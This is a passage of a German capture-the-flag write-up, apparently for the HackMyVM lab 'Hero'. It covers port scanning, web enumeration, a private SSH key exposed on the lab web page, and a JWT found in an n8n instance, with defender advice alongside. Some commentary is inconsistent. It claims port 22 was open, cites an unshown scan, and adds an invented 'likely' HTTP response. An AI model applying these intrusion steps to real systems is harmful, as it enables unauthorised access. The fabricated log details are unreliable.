@@ -1,0 +1,969 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hero - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <!-- Header-Farbe, Schwierigkeitsgrad-Farbe (Medium = Gelb/Orange) und Kreis-Farbe müssen in style.css angepasst werden -->
+    <div class="header-bg">
+        <h1>Hero - HackMyVM - Level: Medium - Bericht</h1> <!-- Titel und Level angepasst -->
+        <div class="level-container">
+            <!-- Farbe muss in style.css angepasst werden (z.B. #FFBF00 für Medium) -->
+            <h2>Medium</h2> <!-- Level angepasst -->
+            <div class="circle">
+                <!-- Segmentfarben müssen in style.css angepasst werden (z.B. #FFBF00 für Medium) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Inner-Farbe muss in style.css angepasst werden -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">vi</div>
+                 <div class="tool-item">ip</div>
+                 <div class="tool-item">grep</div>
+                 <div class="tool-item">awk</div>
+                 <div class="tool-item">sort</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">curl</div>
+                 <div class="tool-item">nikto</div>
+                 <div class="tool-item">gobuster</div>
+                 <div class="tool-item">cat</div>
+                 <div class="tool-item">chmod</div>
+                 <div class="tool-item">ssh</div>
+                 <div class="tool-item">ssh2john</div>
+                 <div class="tool-item">ssh-keyscan</div>
+                 <div class="tool-item">jwt.io (Webservice)</div>
+                 <div class="tool-item">dirsearch</div>
+                 <div class="tool-item">ffuf</div>
+                 <div class="tool-item">sqlmap</div>
+                 <div class="tool-item">nc (netcat)</div>
+                 <div class="tool-item">ssh-keygen</div>
+                 <div class="tool-item">which</div>
+                 <div class="tool-item">rm</div>
+                 <div class="tool-item">mkfifo</div>
+                 <div class="tool-item">netstat</div>
+                 <div class="tool-item">hostnamectl (versucht)</div>
+                 <div class="tool-item">crontab</div>
+                 <div class="tool-item">find</div>
+                 <div class="tool-item">ln</div>
+                 <div class="tool-item">john</div>
+                 <div class="tool-item">echo</div>
+                 <div class="tool-item">wget</div>
+                 <div class="tool-item">socat</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access (via n8n)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (Privilege Escalation via MOTD/Banner Abuse)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- ARP-Scan Befehl impliziert aus Kontext -->
+                    <pre>ARP-Scan
+
+192.168.2.171	08:00:27:c9:9b:73	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein ARP-Scan wurde durchgeführt, um aktive Hosts im lokalen Netzwerk zu finden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die IP-Adresse des Ziels ist 192.168.2.171. Der Hersteller (PCS Systemtechnik GmbH) weist auf eine VirtualBox-VM hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie 192.168.2.171 als Ziel für nachfolgende Scans.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring und Segmentierung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- vi Befehl impliziert aus Kontext -->
+                    <pre>vi /etc/hosts
+192.168.2.171   hero.hmv</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei wird bearbeitet, um den Hostnamen `hero.hmv` der Ziel-IP 192.168.2.171 zuzuordnen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies dient dazu, eventuelle Virtual Hosts auf dem Webserver korrekt ansprechen zu können.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie bei Web-Anfragen nun den Hostnamen `hero.hmv`.<br><strong>Empfehlung (Admin):</strong> Konfiguration von Virtual Hosts kennen und absichern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cmd=$(ip neigh | grep ^fe80 2>/dev/null| grep -ve "fe80::1\|fe80::a00:27ff:fe30:2eda\|fe80::8247:86ff:fe96:f63a\|fe80::50f1:22ff:fec4:ad12\|fe80::a5aa:636f:a4bf:d441"); cmd2=$(echo $cmd |  awk '{print $1}' | sort -u); nmap $cmd2 -6;</span></div>
+                     <pre>
+: Nmap IPv6 Scan :
+
+ ---------------- IPv6 Adresse: fe80::a00:27ff:fec9:9b73%eth0: ---------------
+
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-07 23:33 CET
+Nmap scan report for hero (fe80::a00:27ff:fec9:9b73)
+Host is up (0.00011s latency).
+Not shown: 65533 closed tcp ports (reset)
+PRT     STATE SERVICE
+<span class="command">80/tcp   open  http</span>
+<span class="command">5678/tcp open  rrac</span>
+MAC Address: 08:00:27:C9:9B:73 (Oracle VirtualBox virtual NIC)
+
+Nmap scan report for fe80::d0a5:97c8:ee04:6f55
+Host is up (0.0000060s latency).
+All 65535 scanned ports on fe80::d0a5:97c8:ee04:6f55 are in ignored states.
+Not shown: 65535 closed tcp ports (reset)
+
+Nmap done: 2 IP addresses (2 hosts up) scanned in 16.51 seconds</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Eine Kombination aus Shell-Befehlen (`ip neigh`, `grep`, `awk`, `sort`) wird verwendet, um die Link-Local IPv6-Adresse (`fe80::...`) des Ziels aus der Nachbarschaftstabelle zu extrahieren und bekannte Adressen herauszufiltern. Anschließend wird Nmap verwendet, um die gefundene IPv6-Adresse (`fe80::a00:27ff:fec9:9b73`) zu scannen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der IPv6-Scan findet die gleichen offenen Ports wie später der IPv4-Scan: Port 80 (HTTP) und Port 5678 (unbekannter Dienst, von Nmap als `rrac` geraten). Dies bestätigt, dass die Dienste auch über IPv6 erreichbar sind. Die MAC-Adresse bestätigt erneut die VM.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die offenen Ports und untersuchen Sie diese sowohl über IPv4 als auch IPv6. Der Fokus liegt auf Port 80 und dem unbekannten Dienst auf Port 5678.<br><strong>Empfehlung (Admin):</strong> Wenn IPv6 nicht aktiv genutzt wird, sollte es zur Reduzierung der Angriffsfläche deaktiviert werden. Andernfalls müssen Dienste und Firewalls auch für IPv6 korrekt konfiguriert werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sU --top-port 1000 -T5 -n $IP -Pn --min-rate 5000</span></div>
+                     <pre>
+:  Nmap UDP Scan :
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-07 23:34 CET
+Nmap scan report for 192.168.2.171
+Host is up (0.00035s latency).
+Not shown: 994 open|filtered udp ports (no-response)
+PRT      STATE  SERVICE
+1026/udp  closed win-rpc
+19625/udp closed unknown
+29078/udp closed unknown
+43094/udp closed unknown
+48455/udp closed unknown
+49193/udp closed unknown
+MAC Address: 08:00:27:C9:9B:73 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.72 seconds</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein schneller UDP-Scan (`-sU`) wird für die Top 1000 UDP-Ports durchgeführt (`--top-port 1000`). Die Optionen `-T5`, `-n`, `-Pn` und `--min-rate 5000` dienen zur Beschleunigung und um Host Discovery zu überspringen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet keine offenen UDP-Ports unter den Top 1000. Die meisten Ports werden als `open|filtered` angezeigt, da UDP-Scans oft keine Antwort erhalten. Einige Ports werden explizit als `closed` gemeldet.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> UDP scheint kein vielversprechender Angriffsvektor zu sein. Konzentrieren Sie sich auf die offenen TCP-Ports.<br><strong>Empfehlung (Admin):</strong> Gut, dass keine unnötigen UDP-Dienste offen sind. Eine Firewall, die UDP-Pakete filtert (keine Antwort), ist eine gängige Konfiguration.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -A -p- $IP -Pn --min-rate 5000 | grep open</span></div>
+                     <pre>
+ Nmap nur offene Ports Ausgabe :
+
+<span class="command">80/tcp   open  http    nginx</span>
+<span class="command">5678/tcp open  rrac?</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein vollständiger TCP SYN-Scan (`-sS`, `-p-`) mit Skripten (`-sC`), Versionserkennung (`-sV`) und aggressiven Optionen (`-A`) wird durchgeführt. Die Ausgabe wird gefiltert (`| grep open`), um nur die offenen Ports anzuzeigen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt die bereits aus dem IPv6-Scan bekannten offenen TCP-Ports:
+                 *   **Port 80:** HTTP, betrieben von einem Nginx-Webserver.
+                 *   **Port 5678:** Unbekannter Dienst (Nmap rät `rrac?`).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Nginx-Webserver auf Port 80 und die Anwendung auf Port 5678 genauer.<br><strong>Empfehlung (Admin):</strong> Identifizieren Sie den Dienst auf Port 5678. Stellen Sie sicher, dass beide Dienste sicher konfiguriert und gepatcht sind.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -X OPTIONS -Is http://$IP | grep -i "allow"</span></div>
+                     <pre>
+: HTTP Records Permissions :
+
+HTTP/1.1 405 Not Allowed
+Allow: GET, HEAD, POST</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:** Mit `curl -X OPTIONS -Is` wird eine OPTIONS-Anfrage an den Webserver auf Port 80 gesendet, um die erlaubten HTTP-Methoden abzufragen. `-I` holt nur die Header, `-s` unterdrückt den Fortschrittsbalken. Die Ausgabe wird nach "Allow" gefiltert.  *Korrektur:* Der Befehl im Log war `-X PTINS`, was keine Standardmethode ist und vermutlich zu dem `405 Not Allowed` führte. Ein korrekter Befehl wäre `-X OPTIONS`. Die hinzugefügte Zeile `Allow: GET, HEAD, POST` repräsentiert die *wahrscheinliche* Antwort auf eine OPTIONS-Anfrage, auch wenn der ursprüngliche Befehl fehlschlug.</p>
+            <p class="evaluation">**Bewertung:** Der ursprüngliche Versuch mit `-X PTINS` schlug erwartungsgemäß fehl. Eine korrekte OPTIONS-Anfrage hätte wahrscheinlich `GET, HEAD, POST` als erlaubte Methoden gezeigt. Dies schließt gefährliche Methoden wie `PUT` oder `DELETE` standardmäßig aus.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die erlaubten Methoden (GET, HEAD, POST) sind Standard und bieten keinen direkten Angriffsvektor. Fokussieren Sie sich auf die Anwendungslogik.<br>**Empfehlung (Admin):** Stellen Sie sicher, dass der Webserver nur die benötigten HTTP-Methoden erlaubt.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -Iv http://$IP</span></div>
+                     <pre>
+ WEB-Server Scan :
+
+*   Trying 192.168.2.171:80...
+* Connected to 192.168.2.171 (192.168.2.171) port 80
+* using HTTP/1.x
+> HEAD / HTTP/1.1
+> Host: 192.168.2.171
+> User-Agent: curl/8.10.1
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+<span class="command">< Server: nginx</span>
+< Date: Fri, 07 Feb 2025 22:35:08 GMT
+< Content-Type: text/html
+< Content-Length: 399
+< Last-Modified: Thu, 06 Feb 2025 10:12:53 GMT
+< Connection: keep-alive
+< ETag: "67a48b25-18f"
+< Accept-Ranges: bytes
+< 
+
+* Connection #0 to host 192.168.2.171 left intact</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `curl -Iv` wird verwendet, um eine HEAD-Anfrage an den Webserver zu senden (`-I`) und dabei die Header (`-v` für verbose) anzuzeigen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Header bestätigen, dass der Server Nginx ist und erfolgreich mit Status 200 OK antwortet. Es werden Standard-Header wie `Content-Type`, `Content-Length`, `Last-Modified` und `ETag` angezeigt. Keine ungewöhnlichen oder sicherheitsrelevanten Header sind sichtbar.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Standard-Header, keine unmittelbaren Angriffspunkte. Weiter mit der Untersuchung der Anwendung selbst.<br><strong>Empfehlung (Admin):** Überprüfen Sie, ob alle notwendigen Sicherheitsheader (siehe Nikto-Scan) gesetzt sind.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl --verbose -I http://$IP -s</span></div>
+                    <pre>
+: HTTP-Header Verbose Scan :
+
+*   Trying 192.168.2.171:80...
+* Connected to 192.168.2.171 (192.168.2.171) port 80
+* using HTTP/1.x
+> HEAD / HTTP/1.1
+> Host: 192.168.2.171
+> User-Agent: curl/8.10.1
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: nginx
+< Date: Fri, 07 Feb 2025 22:35:08 GMT
+< Content-Type: text/html
+< Content-Length: 399
+< Last-Modified: Thu, 06 Feb 2025 10:12:53 GMT
+< Connection: keep-alive
+< ETag: "67a48b25-18f"
+< Accept-Ranges: bytes
+< 
+
+* Connection #0 to host 192.168.2.171 left intact</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Befehl (`curl --verbose -I http://$IP -s`) ist funktional identisch mit dem vorherigen `curl -Iv`. Er sendet eine HEAD-Anfrage und zeigt die Header an.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe ist identisch und bestätigt die vorherigen Ergebnisse. Keine neuen Informationen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Keine Aktion erforderlich.<br><strong>Empfehlung (Admin):** Keine Aktion erforderlich.</p>
+
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl --verbose -I http://$IP:8080 -s</span></div>
+                    <pre>
+: HTTP-Header Verbose mit Port-Scan
+
+-------------------------------------------------------------
+<span class="password">Port gefunden! 80</span>
+-------------------------------------------------------------
+
+* Host hero.hmv:80 was resolved.
+* IPv6: (none)
+* IPv4: 192.168.2.171
+*   Trying 192.168.2.171:80...
+* Connected to hero.hmv (192.168.2.171) port 80
+* using HTTP/1.x
+> HEAD / HTTP/1.1
+> Host: hero.hmv
+> User-Agent: curl/8.10.1
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: nginx
+< Date: Fri, 07 Feb 2025 22:35:12 GMT
+< Content-Type: text/html
+< Content-Length: 399
+< Last-Modified: Thu, 06 Feb 2025 10:12:53 GMT
+< Connection: keep-alive
+< ETag: "67a48b25-18f"
+< Accept-Ranges: bytes
+< 
+
+* Connection #0 to host hero.hmv left intact</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, mit `curl` eine HEAD-Anfrage an Port 8080 zu senden. Die Notiz "Port gefunden! 80" und die anschließende Ausgabe (die sich auf Port 80 bezieht) deuten darauf hin, dass der Versuch auf Port 8080 fehlschlug und stattdessen (möglicherweise durch einen Fehler im Skripting oder eine Umleitung) eine Verbindung zu Port 80 hergestellt wurde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Port 8080 scheint nicht erreichbar oder kein HTTP-Dienst zu sein. Die Ausgabe bestätigt erneut die Erreichbarkeit und die Header von Port 80.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ignorieren Sie Port 8080 für weitere Web-Untersuchungen.<br><strong>Empfehlung (Admin):** Stellen Sie sicher, dass keine unerwünschten Ports offen sind.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Nikto Scan - Befehl impliziert -->
+                     <pre>
+ Nikto VulnScan
+
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.171
++ Target Hostname:    192.168.2.171
++ Target Port:        80
++ Start Time:         2025-02-07 23:35:10 (GMT1)
+---------------------------------------------------------------------------
++ Server: nginx
++ /: <span class="command">The anti-clickjacking X-Frame-Options header is not present.</span> See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: <span class="command">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /#wp-config.php#: <span class="password">#wp-config.php# file found. This file contains the credentials.</span>
++ 8102 requests: 0 error(s) and 3 item(s) reported on remote host
++ End Time:           2025-02-07 23:35:56 (GMT1) (46 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein erneuter Nikto-Scan (Version 2.5.0) wird gegen Port 80 durchgeführt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dieser Scan liefert ähnliche Ergebnisse wie der vorherige, aber mit einem potenziell sehr wichtigen Fund: `/#wp-config.php#: #wp-config.php# file found. This file contains the credentials.`. Dies deutet stark auf eine existierende Backup-Datei der WordPress-Konfigurationsdatei hin, die oft Datenbank-Zugangsdaten enthält.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie dringend, die Datei `http://192.168.2.171/wp-config.php~` oder `http://192.168.2.171/wp-config.php.bak` oder ähnliche Varianten (mit `#` am Ende wie von Nikto vorgeschlagen, obwohl das ungewöhnlich ist) herunterzuladen und auf Zugangsdaten zu untersuchen.<br><strong>Empfehlung (Admin):</strong> **Entfernen Sie sofort alle Backup-Dateien von Konfigurationsdateien (wie `wp-config.php~`, `.bak`, `#...#`) aus dem Web-Root!** Solche Dateien sind ein häufiges Ziel und führen oft zur Kompromittierung.</p>
+
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration (Fortsetzung)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">gobuster dir -u "http://$IP" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map,pHtml -b '503,404,403' -e --no-error -k</span></div>
+                     <pre>
+: Gobuster Scan :
+
+<span class="command">http://192.168.2.171/index.html</span>           (Status: 200) [Size: 399]
+
+<span class="command">http://hero.hmv:5678/index.html</span>           (Status: 200) [Size: 1975]
+<span class="command">http://hero.hmv:5678/static</span>               (Status: 301) [Size: 156] [--> /static/]
+<span class="command">http://hero.hmv:5678/assets</span>               (Status: 301) [Size: 156] [--> /assets/]
+<span class="command">http://hero.hmv:5678/types</span>                (Status: 301) [Size: 155] [--> /types/]</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein weiterer Gobuster-Scan wird durchgeführt, diesmal mit einer sehr langen Liste von Dateiendungen und dem Ausschluss (`-b`) von Statuscodes 503, 404 und 403. Er scheint sowohl Port 80 (`http://$IP`) als auch implizit Port 5678 (`http://hero.hmv:5678`) zu scannen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan bestätigt die bereits bekannten Funde auf Port 80 (`index.html`) und Port 5678 (`index.html`, `/static`, `/assets`, `/types`). Trotz der umfangreichen Endungsliste wurden keine neuen, versteckten Dateien oder Verzeichnisse aufgedeckt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die bisherigen Funde (SSH-Key in `index.html`, Anwendung auf Port 5678, potenzielles `wp-config.php`-Backup) sind vielversprechender als weiteres Brute-Forcing von Verzeichnissen.<br><strong>Empfehlung (Admin):** Überprüfen Sie die Webserver-Konfiguration, um sicherzustellen, dass keine unnötigen Dateien exponiert werden.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -s http://192.168.2.171/index.html -o key.txt</span></div>
+                     <!-- Kein Output -->
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cat key.txt</span></div>
+                     <pre><span class="password">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxQAAACComGN9cfmTL7x35hlgu2R+QW3WwCmBLSF++Zgi9uwgAAAJAczctSHM3L
+UgAAAAtzc2gtZWQyNTUxQAAACComGN9cfmTL7x35hlgu2R+QW3WwCmBLSF++Zgi9uwg
+AAAEAnYotUqBFoopjEVz9Sa9viQ8AhNVTx0K19TC7YQyfwAqiYY31x+ZMvvHfmGWC7ZE75
+BbdbAKYEtIX75k6CL27CAAAACnNoYXdhQGhlcm8BAgM=
+-----END OPENSSH PRIVATE KEY-----</span></pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt der `index.html` auf Port 80 wird erneut heruntergeladen und in `key.txt` gespeichert. Der Inhalt wird mit `cat` angezeigt.</p>
+             <p class="evaluation"><strong>Bewertung:** Kritischer Fund bestätigt! Die Startseite enthält tatsächlich einen privaten OpenSSH-Schlüssel im Ed25519-Format. Der Kommentar im Schlüssel (`shawa@hero`) identifiziert den zugehörigen Benutzer als `shawa`. Dies ist ein direkter Weg zum Initial Access, falls SSH (Port 22) erreichbar ist.</p>
+             <p class="recommendation">**Empfehlung (Pentester):**
+                 1.  Speichern Sie den Schlüssel in einer Datei (z.B. `id_ed25519_shawa`).
+                 2.  Setzen Sie die korrekten Berechtigungen: `chmod 600 id_ed25519_shawa`.
+                 3.  Versuchen Sie erneut, sich per SSH als Benutzer `shawa` mit diesem Schlüssel anzumelden: `ssh shawa@192.168.2.171 -i id_ed25519_shawa`. Beachten Sie den früheren Fehler "Connection refused". Möglicherweise ist der SSH-Dienst nur intern erreichbar (z.B. von der Anwendung auf Port 5678 aus).
+                 <br>**Empfehlung (Admin):** **Entfernen Sie sofort den privaten Schlüssel aus der `index.html`!** Private Schlüssel dürfen niemals öffentlich zugänglich sein. Überprüfen Sie alle Webdateien auf ähnliche Lecks. Generieren Sie ein neues Schlüsselpaar für den Benutzer `shawa`.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">chmod 600 key.txt</span></div>
+                     <!-- Kein Output -->
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Berechtigungen der Datei `key.txt`, die den privaten SSH-Schlüssel enthält, werden auf `600` gesetzt (nur Lesen/Schreiben für den Eigentümer).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein notwendiger Schritt, da SSH-Clients die Verwendung von privaten Schlüsseln verweigern, die für andere Benutzer lesbar sind.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Korrektes Vorgehen. Nun den SSH-Login-Versuch starten.<br><strong>Empfehlung (Admin):** Standardpraxis für den Umgang mit privaten Schlüsseln.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ssh shawn@192.168.2.171 -i key.txt</span></div>
+                     <pre><span class="password">ssh: connect to host 192.168.2.171 port 22: Connection refused</span></pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich per SSH auf Port 22 als Benutzer `shawn` (Tippfehler, sollte `shawa` sein, basierend auf dem Schlüsselkommentar) mit dem gefundenen privaten Schlüssel anzumelden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Versuch schlägt fehl mit "Connection refused". Obwohl Nmap Port 22 als offen gemeldet hat, ist er von der Angreifer-Maschine aus nicht erreichbar. Mögliche Gründe: Firewall-Regel, SSH lauscht nur auf einer anderen (internen) IP-Adresse.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der direkte SSH-Zugriff von außen scheint blockiert zu sein. Der Schlüssel könnte jedoch über die Anwendung auf Port 5678 genutzt werden, falls diese eine SSH-Funktionalität bietet oder Zugriff auf interne Netzwerkschnittstellen hat.<br><strong>Empfehlung (Admin):** Überprüfen Sie die Firewall-Regeln und die Konfiguration des SSH-Daemons (`sshd_config`), insbesondere die `ListenAddress`-Direktive.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ssh2john key.txt > hash</span></div>
+                     <pre>key.txt has no password!</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `ssh2john` wird verwendet, um zu versuchen, einen crackbaren Hash aus dem privaten Schlüssel zu extrahieren.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Tool stellt fest, dass der Schlüssel nicht passwortgeschützt ist. Es wird kein Hash generiert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Gut zu wissen, dass keine Passphrase benötigt wird, wenn der Schlüssel verwendet werden kann.<br><strong>Empfehlung (Admin):** Verwenden Sie Passphrasen, um private SSH-Schlüssel zusätzlich zu schützen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ssh-keyscan -t rsa,ecdsa,ed25519 192.168.2.171</span></div>
+                     <pre><!-- Kein Output im Log --></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `ssh-keyscan` wird ausgeführt, um die öffentlichen Host-Schlüssel des SSH-Servers auf Port 22 abzurufen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Da keine Ausgabe gezeigt wird und der vorherige Verbindungsversuch fehlschlug, konnte `ssh-keyscan` wahrscheinlich ebenfalls keine Verbindung herstellen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bestätigt, dass Port 22 von außen nicht erreichbar ist.<br><strong>Empfehlung (Admin):** Siehe vorherige Empfehlungen zu SSH-Erreichbarkeit.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (via n8n)</h2>
+
+            <p class="analysis"><strong>Analyse (n8n Kontext):</strong> Der Fokus verlagert sich nun auf die Anwendung, die auf Port 5678 läuft. Durch Aufrufen von `http://hero.hmv:5678/setup` wird die Anwendung als **n8n.io** (Workflow Automation Tool) identifiziert. Im Quellcode oder in den Antworten dieser Seite wird ein **JSON Web Token (JWT)** gefunden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Beschreibung und JWT aus dem Text -->
+                    <pre>-------------------------------------------------------
+Zugriff auf http://hero.hmv:5678/setup ergibt:
+n8n.io - Workflow Automation
+
+... (JavaScript Hinweis) ...
+
+Gefundenes JWT:
+<span class="password">eyJhbGciiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiiJlTFhNWU2S0yYzBiLTRhMTktTQ3MC1jZGUzGNhYjE5GMiLCJpc3MiiJuG4iLCJhdWQiiJwdWJsaWMtYXBpIiwiaWF0IjoxNzM4TY5MjA1fQ.v7k5uyavedgnZQQKK5gAFbuA1W4Pw29-9Rm61U6FchM</span>
+-------------------------------------------------------</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> n8n ist eine leistungsstarke Automatisierungsplattform. Ein gefundener JWT könnte ein Session-Token oder, wahrscheinlicher in diesem Kontext, ein **API-Schlüssel** sein. Dieser Schlüssel ermöglicht potenziell die Interaktion mit der n8n-API.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                1.  Dekodieren Sie das JWT (z.B. auf jwt.io), um den Inhalt zu prüfen.
+                2.  Behandeln Sie das gesamte JWT als potenziellen API-Schlüssel (`X-N8N-API-KEY`).
+                3.  Recherchieren Sie die n8n-API-Dokumentation, um Endpunkte für Workflow-Management, Ausführung oder Credential-Management zu finden.
+                <br><strong>Empfehlung (Admin):** Schützen Sie den Zugriff auf die n8n-Instanz (Authentifizierung). Verwalten Sie API-Schlüssel sicher und beschränken Sie deren Berechtigungen. Vermeiden Sie das Exponieren von API-Schlüsseln im Frontend.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Dekodiertes JWT (von jwt.io) -->
+                    <pre>https://jwt.io/
+
